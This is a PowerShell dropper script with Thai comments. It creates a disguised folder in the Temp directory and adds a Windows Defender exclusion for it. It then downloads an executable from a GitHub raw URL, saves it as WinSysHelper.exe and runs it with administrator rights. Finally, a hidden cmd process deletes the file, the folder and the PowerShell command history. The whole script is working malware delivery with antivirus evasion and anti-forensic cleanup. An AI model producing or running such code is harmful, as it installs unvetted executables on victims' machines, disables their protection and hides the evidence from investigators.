$ErrorActionPreference = 'SilentlyContinue'

# 1. ตั้งเป้าหมายไปที่โฟลเดอร์ที่ Defender มักจะมองข้าม หรือสร้างโฟลเดอร์ใหม่
$dir = "$env:LOCALAPPDATA\Temp\SystemData"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
$output = "$dir\WinSysHelper.exe"

# 2. (ไม้ตาย) สั่งให้ Windows Defender เลิกยุ่งกับโฟลเดอร์นี้ชั่วคราว
# ต้องรันด้วยสิทธิ์ที่ได้จากไอคอนโล่ (UAC) ซึ่งสคริปต์เราพยายามทำอยู่แล้ว
Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

# 3. ดาวน์โหลดไฟล์ (ใช้ WebClient เพื่อความชัวร์)
try {
    if (Test-Path $output) { Remove-Item $output -Force }
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe", $output)
} catch {}

# 4. เช็คและรัน
if (Test-Path $output) {
    # รันแบบ Admin
    $p = Start-Process -FilePath $output -Verb RunAs -PassThru
    
    # ถ้าเปิดติด ให้รอ 5 วิแล้วค่อยปิด PowerShell
    if ($p) { Start-Sleep -Seconds 5 }
}

# 5. สั่ง CMD มาเก็บกวาดประวัติและโฟลเดอร์ทิ้ง (หน่วงเวลา 15 วิ)
$history = (Get-PSReadlineOption).HistorySavePath
$clean = "timeout /t 15 && del /f /q `"$output`" && rd /s /q `"$dir`" && del /f /q `"$history`""
Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden

exit
